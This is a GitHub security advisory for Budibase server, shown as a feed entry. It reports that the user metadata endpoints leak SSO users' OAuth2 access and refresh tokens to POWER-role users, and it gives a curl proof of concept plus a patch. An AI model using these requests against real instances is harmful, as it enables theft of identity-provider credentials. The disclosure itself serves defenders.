        <link href="https://github.com/advisories/GHSA-fcrw-f7gg-6g9f"/>
        <updated>2026-07-24T21:14:32.000Z</updated>
        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
<p>The <code>/api/users/metadata</code> and <code>/api/users/metadata/:id</code> endpoints in <code>@budibase/server</code> return full global user profiles to any user with POWER role or above. For SSO-authenticated users (OIDC, Google), the response includes <code>oauth2.accessToken</code> and <code>oauth2.refreshToken</code> fields, leaking identity provider credentials to other users who should not have access to them.</p>
<h2 id="details">Details</h2>
<p>When a user authenticates via SSO (OIDC or Google), the OAuth2 tokens are stored in the global CouchDB user document at <code>packages/backend-core/src/auth/auth.ts:170-173</code>:</p>
<pre><code class="language-typescript">dbUser.oauth2 = {
  ...dbUser.oauth2,
  ...details,
}
await db.put(dbUser)
</code></pre>
<p>The user metadata endpoints are protected by <code>PermissionType.USER, PermissionLevel.READ</code> (<code>packages/server/src/api/routes/user.ts:11</code>), which maps to the POWER permission set (<code>packages/backend-core/src/security/permissions.ts:99</code>).</p>
<p><strong>Path 1 — List all users</strong> (<code>GET /api/users/metadata</code>):</p>
<ol>
<li><code>controller.fetchMetadata</code> → <code>sdk.users.fetchMetadata()</code> (<code>packages/server/src/sdk/users/utils.ts:78</code>)</li>
<li>→ <code>getGlobalUsers()</code> → <code>getRawGlobalUsers()</code> (<code>packages/server/src/utilities/global.ts:101-122</code>) — strips only <code>password</code> and <code>forceResetPassword</code></li>
<li>→ <code>processUser()</code> (<code>packages/server/src/utilities/global.ts:15-76</code>) — strips only <code>password</code> and <code>roles</code></li>
<li>The <code>oauth2</code> field containing <code>accessToken</code> and <code>refreshToken</code> is <strong>never removed</strong></li>
</ol>
<p><strong>Path 2 — Single user</strong> (<code>GET /api/users/metadata/:id</code>):</p>
<ol>
<li><code>controller.findMetadata</code> → <code>getFullUser()</code> (<code>packages/server/src/utilities/users.ts:6</code>)</li>
<li>→ <code>getGlobalUser()</code> → <code>getRawGlobalUser()</code> (<code>packages/server/src/utilities/global.ts:90-92</code>) — raw CouchDB fetch, <strong>no field stripping at all</strong></li>
<li>→ <code>processUser()</code> — strips only <code>password</code> and <code>roles</code></li>
<li>Same result: <code>oauth2</code> tokens are returned</li>
</ol>
<p>There is no output sanitization middleware on these routes that would strip sensitive fields before the response reaches the client.</p>
<h2 id="poc">PoC</h2>
<p><strong>Prerequisites:</strong> A Budibase instance with at least one SSO-authenticated user (OIDC or Google) and a separate user with POWER role in an app.</p>
<p><strong>Step 1 — As the POWER user, list all users:</strong></p>
<pre><code class="language-bash">curl -s -X GET 'http://localhost:10000/api/users/metadata' \
  -H 'Cookie: budibase:auth=&lt;power-user-jwt&gt;' \
  -H 'x-budibase-app-id: app_&lt;appid&gt;' | jq '.[].oauth2'
</code></pre>
<p><strong>Expected output:</strong> <code>null</code> for all users (tokens should not be exposed)</p>
<p><strong>Actual output:</strong> For SSO users, the response includes:</p>
<pre><code class="language-json">{
  "accessToken": "ya29.a0ARrdaM...",
  "refreshToken": "1//0eXxXxXxXx..."
}
</code></pre>
<p><strong>Step 2 — Fetch a specific SSO user's profile:</strong></p>
<pre><code class="language-bash">curl -s -X GET 'http://localhost:10000/api/users/metadata/ro_ta_users_us_&lt;sso-user-id&gt;' \
  -H 'Cookie: budibase:auth=&lt;power-user-jwt&gt;' \
  -H 'x-budibase-app-id: app_&lt;appid&gt;' | jq '.oauth2'
</code></pre>
<p>This also returns the full OAuth2 tokens.</p>
<h2 id="impact">Impact</h2>
<ul>
<li>A user with POWER role in any app can read <strong>all SSO users' OAuth2 access tokens and refresh tokens</strong> via the list endpoint, without needing to know individual user IDs.</li>
<li>Stolen access tokens can be used to access external identity provider resources (Google Workspace, Azure AD, Okta-protected services) as the victim user.</li>
<li>Refresh tokens allow indefinite token renewal, persisting access even after the original access token expires.</li>
<li>Additionally, <code>admin</code>, <code>builder</code>, <code>tenantId</code>, <code>ssoId</code>, and <code>userGroups</code> fields are leaked, revealing the full authorization topology of the instance.</li>
</ul>
<h2 id="recommended-fix">Recommended Fix</h2>
<p>Strip sensitive SSO fields in <code>processUser()</code> at <code>packages/server/src/utilities/global.ts:15</code>:</p>
<pre><code class="language-typescript">export async function processUser(
  user: ContextUser,
  opts: { appId?: string; groups?: UserGroup[] } = {}
) {
  if (!user || (!user.roles &amp;&amp; !user.userGroups)) {
    return user
  }
  user = cloneDeep(user)
  delete user.password
+ delete (user as any).oauth2
+ delete (user as any).provider
+ delete (user as any).providerType
+ delete (user as any).thirdPartyProfile
+ delete (user as any).profile
+ delete (user as any).ssoId
+ delete (user as any).forceResetPassword
  // ... rest of function
</code></pre>
<p>Additionally, <code>getRawGlobalUsers()</code> at line 101 should also strip <code>oauth2</code> alongside its existing <code>password</code>/<code>forceResetPassword</code> stripping for defense in depth.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/Budibase/budibase/security/advisories/GHSA-fcrw-f7gg-6g9f">https://github.com/Budibase/budibase/security/advisories/GHSA-fcrw-f7gg-6g9f</a></li>
<li><a href="https://github.com/Budibase/budibase/pull/19110">https://github.com/Budibase/budibase/pull/19110</a></li>
<li><a href="https://github.com/Budibase/budibase/commit/7b8ba11a2c8b233c35e7728dd752dba25ef919a4">https://github.com/Budibase/budibase/commit/7b8ba11a2c8b233c35e7728dd752dba25ef919a4</a></li>
<li><a href="https://github.com/Budibase/budibase/commit/80a31f6c3354620aa90e50af8a2c614333084621">https://github.com/Budibase/budibase/commit/80a31f6c3354620aa90e50af8a2c614333084621</a></li>
<li><a href="https://github.com/Budibase/budibase/releases/tag/3.39.25">https://github.com/Budibase/budibase/releases/tag/3.39.25</a></li>
<li><a href="https://github.com/advisories/GHSA-fcrw-f7gg-6g9f">https://github.com/advisories/GHSA-fcrw-f7gg-6g9f</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-fcrw-f7gg-6g9f</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-07-24T21:14:31.000Z</published>
    </entry>
</feed>